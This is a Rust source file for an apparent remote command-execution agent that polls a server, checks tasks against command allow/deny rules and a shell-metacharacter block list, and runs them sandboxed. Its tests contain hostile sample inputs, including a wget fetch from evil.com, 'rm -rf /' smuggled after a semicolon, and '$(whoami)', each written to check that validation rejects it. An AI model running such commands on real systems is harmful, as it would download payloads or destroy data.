//! Remote command execution module.
//!
//! Polls the server for pending tasks and executes them, streaming stdout/stderr
//! back to the server in real time.
//!
//! Authentication: all requests include `Authorization: Bearer {client_id}:{token}`.
//! The token is persisted to disk by `ClientService::register_client` and loaded here.

use anyhow::{bail, Result};
use common::command::{split_command, CommandLogLine, CommandTask, LogStream};
use common::entity::permission::{CommandAction, CommandRules};
use reqwest::Client as HttpClient;
use std::io::{BufRead as _, BufReader, Read};
use std::os::unix::process::CommandExt;
use std::os::unix::process::ExitStatusExt;
use std::process::{Child, ExitStatus};
use std::sync::atomic::{AtomicI32, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::mpsc;
use tracing::{debug, error, info, warn};

use crate::config::ClientConfig;
use crate::service::load_agent_token_for;

/// Maximum lines to batch before flushing to server.
const LOG_BATCH_SIZE: usize = 20;
/// How long to wait between long-poll retries on error.
const POLL_RETRY_DELAY: Duration = Duration::from_secs(5);
/// How long to wait when agent token is missing before retrying.
const TOKEN_WAIT_DELAY: Duration = Duration::from_secs(30);

#[derive(Clone)]
pub struct CommandExecutor {
    config: Arc<ClientConfig>,
    client_id: String,
    http: Arc<HttpClient>,
    /// Cached command rules, hot-reloadable without restarting.
    command_rules: Arc<std::sync::RwLock<CommandRules>>,
}

fn resolve_command_rules(config: &ClientConfig) -> CommandRules {
    if !config.execution_command_rules.is_allow_all() {
        return config.execution_command_rules.clone();
    }

    if !config.command_rules.is_allow_all() {
        return config.command_rules.clone();
    }

    // The legacy allow-list is the secure default when no richer rule set is
    // configured. An empty list means deny all, never allow all.
    CommandRules::allow_list(config.allowed_commands.clone())
}

fn ensure_command_allowed(rules: &CommandRules, command: &str, subject: &str) -> Result<()> {
    match rules.evaluate(command) {
        CommandAction::Allow => Ok(()),
        CommandAction::Deny => bail!("{} '{}' is denied by command rules", subject, command),
        CommandAction::Warn => bail!(
            "{} '{}' requires confirmation and is not allowed on the agent",
            subject,
            command
        ),
    }
}

fn parse_shell_lines(script: &str) -> Vec<(usize, String, Vec<String>)> {
    script
        .lines()
        .enumerate()
        .filter_map(|(index, raw_line)| {
            let line = raw_line.trim();
            if line.is_empty() {
                return None;
            }
            let (cmd, args) = split_command(line);
            Some((index + 1, cmd, args))
        })
        .collect()
}

fn spawn_sandboxed_child(program: &str, args: &[String]) -> Result<Child> {
    let mut command = std::process::Command::new(program);
    command
        .args(args)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    unsafe {
        command.pre_exec(|| {
            // Put every command in its own process group so timeout cleanup
            // cannot leave descendants running after the direct child exits.
            if libc::setpgid(0, 0) != 0 {
                return Err(std::io::Error::last_os_error());
            }
            crate::service::sandbox::apply_sandbox()
        });
    }
    Ok(command.spawn()?)
}

fn emit_output_line(
    line_tx: &mpsc::UnboundedSender<CommandLogLine>,
    seq: &AtomicU64,
    line: String,
    stream: LogStream,
) {
    let sequence = seq.fetch_add(1, Ordering::Relaxed);
    let _ = line_tx.send(CommandLogLine {
        seq: sequence,
        line,
        stream,
        timestamp: chrono::Utc::now().to_rfc3339(),
    });
}

fn stream_reader_lines<R: Read>(
    reader: R,
    line_tx: &mpsc::UnboundedSender<CommandLogLine>,
    seq: Arc<AtomicU64>,
    stream: LogStream,
) {
    let mut reader = BufReader::new(reader);
    loop {
        let mut buf = String::new();
        match reader.read_line(&mut buf) {
            Ok(0) => break,
            Ok(_) => {
                let line = buf.trim_end_matches(&['\r', '\n'][..]);
                if !line.is_empty() {
                    emit_output_line(line_tx, &seq, line.to_string(), stream.clone());
                }
            }
            Err(e) => {
                warn!("{:?} read error: {}", stream, e);
                break;
            }
        }
    }
}

fn wait_with_output(
    mut child: Child,
    line_tx: &mpsc::UnboundedSender<CommandLogLine>,
    child_pid: &Arc<AtomicI32>,
    seq: &Arc<AtomicU64>,
) -> Result<ExitStatus> {
    child_pid.store(child.id() as i32, Ordering::Release);

    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");
    let stdout_tx = line_tx.clone();
    let stderr_tx = line_tx.clone();
    let stdout_seq = seq.clone();
    let stderr_seq = seq.clone();
    let stdout_handle = std::thread::spawn(move || {
        stream_reader_lines(stdout, &stdout_tx, stdout_seq, LogStream::Stdout);
    });
    let stderr_handle = std::thread::spawn(move || {
        stream_reader_lines(stderr, &stderr_tx, stderr_seq, LogStream::Stderr);
    });

    // Both pipes are drained concurrently. Reading stdout fully before
    // stderr can deadlock a child that writes enough data to the other pipe.
    let status = child.wait();
    let _ = stdout_handle.join();
    let _ = stderr_handle.join();
    child_pid.store(0, Ordering::Release);
    Ok(status?)
}

impl CommandExecutor {
    pub fn new(config: Arc<ClientConfig>, client_id: String) -> Self {
        let http = HttpClient::builder()
            .danger_accept_invalid_certs(!config.server.verify_tls)
            .timeout(Duration::from_secs(35)) // slightly longer than server 30s hold
            .build()
            .unwrap_or_default();

        let command_rules = Arc::new(std::sync::RwLock::new(resolve_command_rules(&config)));

        Self {
            config,
            client_id,
            http: Arc::new(http),
            command_rules,
        }
    }

    /// Build the `Authorization: Bearer {client_id}:{token}` header value.
    /// Returns `None` if the token hasn't been persisted yet.
    fn auth_header(&self) -> Option<String> {
        load_agent_token_for(&self.client_id)
            .map(|token| format!("Bearer {}:{}", self.client_id, token))
    }

    /// Run the long-poll loop forever (until the task is cancelled).
    pub async fn run_poll_loop(&self) {
        info!(
            "CommandExecutor: starting long-poll loop for client {}",
            self.client_id
        );

        loop {
            // If token not available yet, wait and retry.
            if self.auth_header().is_none() {
                warn!(
                    "CommandExecutor: agent token not found. Waiting {:?} before retrying.",
                    TOKEN_WAIT_DELAY
                );
                tokio::time::sleep(TOKEN_WAIT_DELAY).await;
                continue;
            }

            match self.poll_once().await {
                Ok(Some(task)) => {
                    info!(
                        "CommandExecutor: received task {} command='{}'",
                        task.id, task.command
                    );
                    if let Err(e) = self.execute_task(task).await {
                        error!("CommandExecutor: task execution error: {}", e);
                    }
                }
                Ok(None) => {
                    // No pending task; server held for 30s. Retry immediately.
                    debug!("CommandExecutor: no pending task, re-polling");
                }
                Err(e) => {
                    warn!(
                        "CommandExecutor: poll error: {}. Retrying in {:?}",
                        e, POLL_RETRY_DELAY
                    );
                    tokio::time::sleep(POLL_RETRY_DELAY).await;
                }
            }
        }
    }

    /// Single long-poll request. Returns `Ok(Some(task))` when a task arrives,
    /// `Ok(None)` when the server times out with no task (204).
    async fn poll_once(&self) -> Result<Option<CommandTask>> {
        let url = format!(
            "{}/agent/commands/pending?client_id={}",
            self.config.server.url, self.client_id
        );

        let auth = self
            .auth_header()
            .ok_or_else(|| anyhow::anyhow!("agent token not available"))?;
        let resp = self
            .http
            .get(&url)
            .header("Authorization", auth)
            .send()
            .await?;

        if resp.status() == reqwest::StatusCode::NO_CONTENT {
            return Ok(None);
        }

        if resp.status() == reqwest::StatusCode::UNAUTHORIZED {
            anyhow::bail!("agent token rejected by server (401). Trigger re-registration.");
        }

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            anyhow::bail!("poll_pending returned {}: {}", status, body);
        }

        // The server wraps the task in ApiResponse { data: CommandTask }
        let value: serde_json::Value = resp.json().await?;
        let task: CommandTask =
            serde_json::from_value(value.get("data").cloned().unwrap_or(value))?;
        Ok(Some(task))
    }

    /// Shell metacharacters that are rejected in any argument token.
    const REJECTED_ARG_CHARS: &[char] = &['|', ';', '&', '$', '`', '>', '<', '\n', '\r'];
    const REJECTED_SCRIPT_CHARS: &[char] = &['|', ';', '&', '$', '`', '>', '<'];

    /// Validate that the command is in the whitelist and args are safe.
    fn validate_task(&self, task: &CommandTask) -> Result<()> {
        if task.shell_mode {
            return self.validate_shell_task(task);
        }

        let cmd = &task.command;

        // Check whitelist
        let rules = self
            .command_rules
            .read()
            .map_err(|_| anyhow::anyhow!("command rules lock poisoned"))?;
        ensure_command_allowed(&rules, cmd, "Command")?;
        drop(rules);

        // Check each arg for shell metacharacters
        for (i, arg) in task.args.iter().enumerate() {
            if let Some(pos) = arg.find(Self::REJECTED_ARG_CHARS) {
                bail!(
                    "Argument {} contains rejected character '{}': '{}'",
                    i + 1,
                    arg[pos..].chars().next().unwrap(),
                    arg
                );
            }
            // Reject args that look like flags for sub-shell execution
            if arg.starts_with("--exec") || arg.starts_with("-exec") {
                bail!(
                    "Argument {} '{}' is rejected for security reasons",
                    i + 1,
                    arg
                );
            }
        }

        Ok(())
    }

    fn validate_shell_task(&self, task: &CommandTask) -> Result<()> {
        let rules = self
            .command_rules
            .read()
            .map_err(|_| anyhow::anyhow!("command rules lock poisoned"))?;

        for (line_no, cmd, args) in parse_shell_lines(&task.command) {
            let line = task
                .command
                .lines()
                .nth(line_no - 1)
                .unwrap_or_default()
                .trim();

            if let Some(pos) = line.find(Self::REJECTED_SCRIPT_CHARS) {
                bail!(
                    "Script line {} contains rejected character '{}': '{}'",
                    line_no + 1,
                    line[pos..].chars().next().unwrap(),
                    line
                );
            }

            ensure_command_allowed(
                &rules,
                &cmd,
                &format!("Script line {} command", line_no + 1),
            )?;

            for (arg_index, arg) in args.iter().enumerate() {
                if let Some(pos) = arg.find(Self::REJECTED_SCRIPT_CHARS) {
                    bail!(
                        "Script line {} argument {} contains rejected character '{}': '{}'",
                        line_no + 1,
                        arg_index + 1,
                        arg[pos..].chars().next().unwrap(),
                        arg
                    );
                }
            }
        }

        Ok(())
    }

    /// Execute a single command task with seccomp sandbox (Linux only).
    async fn execute_task(&self, task: CommandTask) -> Result<()> {
        let task_id = task.id.clone();
        let timeout_secs = task.timeout_secs;

        // Claim the task before reporting a local validation failure. The
        // server accepts logs/completion only after the claimed agent has
        // transitioned the task to Running; otherwise a rejected task would
        // remain Pending until its dispatch lease expired.
        self.notify_start(&task_id).await?;

        // Validate command against whitelist and args against shell metacharacters
        if let Err(e) = self.validate_task(&task) {
            error!("Command task {} rejected: {}", task_id, e);
            let rejection_log = CommandLogLine {
                seq: 0,
                line: e.to_string(),
                stream: LogStream::Stderr,
                timestamp: chrono::Utc::now().to_rfc3339(),
            };
            self.flush_logs(&task_id, &[rejection_log]).await?;
            self.notify_complete(&task_id, -1, "failed").await?;
            return Err(e);
        }

        // Channel for streaming log lines from blocking task
        let (line_tx, mut line_rx) = mpsc::unbounded_channel::<CommandLogLine>();

        // Track child PID for timeout termination
        let child_pid = Arc::new(AtomicI32::new(0));
        let pid_for_timeout = child_pid.clone();

        let cmd = task.command.clone();
        let args = task.args.clone();
        let shell_mode = task.shell_mode;
        let shell_lines = if shell_mode {
            parse_shell_lines(&cmd)
        } else {
            Vec::new()
        };

        // Spawn blocking task: applies sandbox via pre_exec, streams logs
        let blocking_handle = tokio::task::spawn_blocking(move || {
            let seq = Arc::new(AtomicU64::new(0));

            if shell_mode {
                let mut final_status = ExitStatus::from_raw(0);
                for (line_no, program, argv) in shell_lines {
                    if program.is_empty() {
                        continue;
                    }
                    let child = match spawn_sandboxed_child(&program, &argv) {
                        Ok(child) => child,
                        Err(err) => {
                            emit_output_line(
                                &line_tx,
                                &seq,
                                format!(
                                    "Script line {} failed to start '{}': {}",
                                    line_no, program, err
                                ),
                                LogStream::Stderr,
                            );
                            return Err(err);
                        }
                    };
                    final_status = wait_with_output(child, &line_tx, &child_pid, &seq)?;
                    if !final_status.success() {
                        break;
                    }
                }
                drop(line_tx);
                Ok(final_status)
            } else {
                let child = spawn_sandboxed_child(&cmd, &args)?;
                let status = wait_with_output(child, &line_tx, &child_pid, &seq)?;
                drop(line_tx);
                Ok(status)
            }
        });

        let timeout = Duration::from_secs(timeout_secs);
        let mut batch: Vec<CommandLogLine> = Vec::new();

        let exit_result = tokio::time::timeout(timeout, async {
            // Process log lines as they arrive
            loop {
                tokio::select! {
                    line = line_rx.recv() => {
                        match line {
                            Some(log) => {
                                batch.push(log);
                                if batch.len() >= LOG_BATCH_SIZE {
                                    self.flush_logs(&task_id, &batch).await?;
                                    batch.clear();
                                }
                            }
                            None => break,
                        }
                    }
                }
            }

            if !batch.is_empty() {
                self.flush_logs(&task_id, &batch).await?;
                batch.clear();
            }

            let result: anyhow::Result<(i32, String)> = match blocking_handle.await {
                Ok(Ok(status)) => {
                    let code = status.code().unwrap_or(-1);
                    let s = if code == 0 { "success" } else { "failed" };
                    anyhow::Ok((code, s.to_string()))
                }
                Ok(Err(e)) => {
                    error!("process spawn/wait error: {}", e);
                    anyhow::Ok((-1, "failed".to_string()))
                }
                Err(e) => {
                    error!("blocking task join error: {}", e);
                    anyhow::Ok((-1, "failed".to_string()))
                }
            };
            result
        })
        .await;

        let (exit_code, status_str) = match exit_result {
            Ok(Ok(pair)) => pair,
            Ok(Err(e)) => {
                error!("log processing error: {}", e);
                (-1, "failed".to_string())
            }
            Err(_) => {
                warn!(
                    "CommandExecutor: task {} timed out, killing process",
                    task_id
                );
                let pid = pid_for_timeout.load(Ordering::Acquire);
                if pid > 0 {
                    unsafe {
                        libc::kill(-pid, libc::SIGTERM);
                        libc::kill(-pid, libc::SIGKILL);
                    }
                }
                (-1, "timeout".to_string())
            }
        };

        self.notify_complete(&task_id, exit_code, &status_str)
            .await?;
        info!(
            "CommandExecutor: task {} finished with status={} exit_code={}",
            task_id, status_str, exit_code
        );
        Ok(())
    }

    /// Build a request builder pre-loaded with the auth header.
    fn authed_post(&self, url: &str) -> anyhow::Result<reqwest::RequestBuilder> {
        let auth = self
            .auth_header()
            .ok_or_else(|| anyhow::anyhow!("agent token not available"))?;
        Ok(self.http.post(url).header("Authorization", auth))
    }

    /// POST /agent/commands/{id}/start
    async fn notify_start(&self, task_id: &str) -> Result<()> {
        let url = format!(
            "{}/agent/commands/{}/start",
            self.config.server.url, task_id
        );
        let resp = self.authed_post(&url)?.send().await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            anyhow::bail!("notify_start returned {}: {}", status, body);
        }
        Ok(())
    }

    /// POST /agent/commands/{id}/logs
    async fn flush_logs(&self, task_id: &str, lines: &[CommandLogLine]) -> Result<()> {
        let url = format!("{}/agent/commands/{}/logs", self.config.server.url, task_id);
        let body = serde_json::json!({ "lines": lines });
        let resp = self.authed_post(&url)?.json(&body).send().await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            warn!("flush_logs returned {}: {}", status, body);
        }
        Ok(())
    }

    /// POST /agent/commands/{id}/complete
    async fn notify_complete(&self, task_id: &str, exit_code: i32, status: &str) -> Result<()> {
        let url = format!(
            "{}/agent/commands/{}/complete",
            self.config.server.url, task_id
        );
        let body = serde_json::json!({
            "exit_code": exit_code,
            "status": status
        });
        let resp = self.authed_post(&url)?.json(&body).send().await?;
        if !resp.status().is_success() {
            let status_code = resp.status();
            let body = resp.text().await.unwrap_or_default();
            anyhow::bail!("notify_complete returned {}: {}", status_code, body);
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::default_config;
    use common::entity::permission::{CommandAction, CommandRules};
    use std::time::Duration;

    #[test]
    fn test_new_executor() {
        let config = Arc::new(default_config());
        let executor = CommandExecutor::new(config, "test-client".into());
        assert_eq!(executor.client_id, "test-client");
    }

    #[test]
    fn test_constants() {
        assert_eq!(LOG_BATCH_SIZE, 20);
        assert_eq!(POLL_RETRY_DELAY, Duration::from_secs(5));
        assert_eq!(TOKEN_WAIT_DELAY, Duration::from_secs(30));
    }

    // ── validate_task: whitelist ──────────────────────────────────────────────

    #[test]
    fn test_validate_allowed_command() {
        let config = Arc::new(default_config());
        let executor = CommandExecutor::new(config, "t".into());
        // 'ping' is in default whitelist
        let task = CommandTask {
            id: "t1".into(),
            client_id: "c1".into(),
            command: "ping".into(),
            args: vec!["-c".into(), "1".into(), "8.8.8.8".into()],
            ..Default::default()
        };
        assert!(executor.validate_task(&task).is_ok());
    }

    #[test]
    fn test_validate_blocked_command() {
        let config = Arc::new(default_config());
        let executor = CommandExecutor::new(config, "t".into());
        // 'wget' is NOT in default whitelist
        let task = CommandTask {
            id: "t2".into(),
            client_id: "c1".into(),
            command: "wget".into(),
            args: vec!["http://evil.com/payload".into()],
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("denied by command rules"));
    }

    #[test]
    fn test_validate_shell_task_allows_multiline_whitelisted_commands() {
        let config = Arc::new(default_config());
        let executor = CommandExecutor::new(config, "t".into());
        let task = CommandTask {
            id: "t3".into(),
            client_id: "c1".into(),
            command: "ls -l\ndf -h".into(),
            shell_mode: true,
            ..Default::default()
        };
        assert!(executor.validate_task(&task).is_ok());
    }

    #[test]
    fn test_parse_shell_lines_skips_blanks_and_splits_lines() {
        let lines = parse_shell_lines("\nls -l\n\ndf -h\n");
        assert_eq!(lines.len(), 2);
        assert_eq!(lines[0].0, 2);
        assert_eq!(lines[0].1, "ls");
        assert_eq!(lines[0].2, vec!["-l"]);
        assert_eq!(lines[1].0, 4);
        assert_eq!(lines[1].1, "df");
        assert_eq!(lines[1].2, vec!["-h"]);
    }

    #[test]
    fn test_validate_shell_task_rejects_shell_chaining() {
        let config = Arc::new(default_config());
        let executor = CommandExecutor::new(config, "t".into());
        let task = CommandTask {
            id: "t4".into(),
            client_id: "c1".into(),
            command: "ls && whoami".into(),
            shell_mode: true,
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("rejected character"));
    }

    #[test]
    fn test_validate_empty_rules_deny_all() {
        let mut cfg = default_config();
        cfg.allowed_commands = vec![];
        cfg.command_rules = CommandRules {
            default_action: CommandAction::Deny,
            overrides: vec![],
        };
        let executor = CommandExecutor::new(Arc::new(cfg), "t".into());
        let task = CommandTask {
            id: "t3".into(),
            client_id: "c1".into(),
            command: "anycmd".into(),
            args: vec!["--help".into()],
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("denied by command rules"));
    }

    #[test]
    fn test_validate_blacklist_blocks_matching_command() {
        let mut cfg = default_config();
        cfg.command_rules = CommandRules::deny_list(vec!["rm".into()]);
        let executor = CommandExecutor::new(Arc::new(cfg), "t".into());
        let task = CommandTask {
            id: "t10".into(),
            client_id: "c1".into(),
            command: "rm".into(),
            args: vec!["-rf".into(), "/tmp/demo".into()],
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("denied by command rules"));
    }

    // ── validate_task: arg rejection ──────────────────────────────────────────

    #[test]
    fn test_validate_rejects_pipe_in_arg() {
        let cfg = Arc::new(default_config());
        let executor = CommandExecutor::new(cfg, "t".into());
        let task = CommandTask {
            id: "t4".into(),
            client_id: "c1".into(),
            command: "echo".into(),
            args: vec!["hello|ls".into()], // pipe char in arg
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("rejected character"));
    }

    #[test]
    fn test_validate_rejects_semicolon_in_arg() {
        let cfg = Arc::new(default_config());
        let executor = CommandExecutor::new(cfg, "t".into());
        let task = CommandTask {
            id: "t5".into(),
            client_id: "c1".into(),
            command: "echo".into(),
            args: vec!["hello; rm -rf /".into()],
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("rejected character"));
    }

    #[test]
    fn test_validate_rejects_dollar_in_arg() {
        let cfg = Arc::new(default_config());
        let executor = CommandExecutor::new(cfg, "t".into());
        let task = CommandTask {
            id: "t6".into(),
            client_id: "c1".into(),
            command: "echo".into(),
            args: vec!["$(whoami)".into()],
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("rejected character"));
    }

    #[test]
    fn test_validate_rejects_backtick_in_arg() {
        let cfg = Arc::new(default_config());
        let executor = CommandExecutor::new(cfg, "t".into());
        let task = CommandTask {
            id: "t7".into(),
            client_id: "c1".into(),
            command: "echo".into(),
            args: vec!["`id`".into()],
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("rejected character"));
    }

    #[test]
    fn test_validate_rejects_exec_flag() {
        let mut cfg = default_config();
        cfg.allowed_commands.push("find".into());
        let executor = CommandExecutor::new(Arc::new(cfg), "t".into());
        let task = CommandTask {
            id: "t8".into(),
            client_id: "c1".into(),
            command: "find".into(),
            args: vec!["/".into(), "-exec".into(), "rm".into()],
            ..Default::default()
        };
        let err = executor.validate_task(&task).unwrap_err();
        assert!(err.to_string().contains("rejected for security"));
    }

    #[test]
    fn test_validate_accepts_normal_args() {
        let cfg = Arc::new(default_config());
        let executor = CommandExecutor::new(cfg, "t".into());
        let task = CommandTask {
            id: "t9".into(),
            client_id: "c1".into(),
            command: "df".into(),
            args: vec!["-h".into(), "/".into()],
            ..Default::default()
        };
        assert!(executor.validate_task(&task).is_ok());
    }
}
